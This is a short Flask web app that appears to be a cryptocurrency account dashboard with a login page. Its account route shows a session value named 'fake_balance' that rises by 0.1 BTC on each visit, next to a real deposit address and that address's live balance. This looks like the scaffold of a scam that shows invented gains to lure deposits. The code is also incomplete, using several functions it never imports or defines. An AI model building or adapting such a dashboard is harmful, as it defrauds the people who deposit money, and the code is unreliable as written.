from flask import Flask, render_template, session, redirect, url_for
import requests

app = Flask(__name__)
app.secret_key = 'your_secret_key'  # Needed for session

@app.route('/account')
def account():
    if 'fake_balance' not in session:
        session['fake_balance'] = 716.0
    else:
        session['fake_balance'] += 0.1

    internal_balance = round(session['fake_balance'], 1)

    deposit_address = 'bc1qg9aph4er0d9rds0f94smgm89ey8n2qamxnsmkp'

    try:
        response = requests.get(f'https://blockstream.info/api/address/{deposit_address}')
        data = response.json()
        deposit_balance = (data['chain_stats']['funded_txo_sum'] - data['chain_stats']['spent_txo_sum']) / 1e8
    except:
        deposit_balance = 0.0

    return render_template(
        'account.html',
        balance=f"{internal_balance} BTC",
        deposit_balance=f"{deposit_balance} BTC",
        deposit_address=deposit_address
    )
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        conn = get_db()
        user = conn.execute("SELECT * FROM users WHERE username = ?", (username,)).fetchone()
        conn.close()

        if user and check_password_hash(user['password'], password):
            session['user_id'] = user['id']
            return redirect(url_for('home'))
        else:
            flash('Invalid username or password')

    return render_template('login.html')
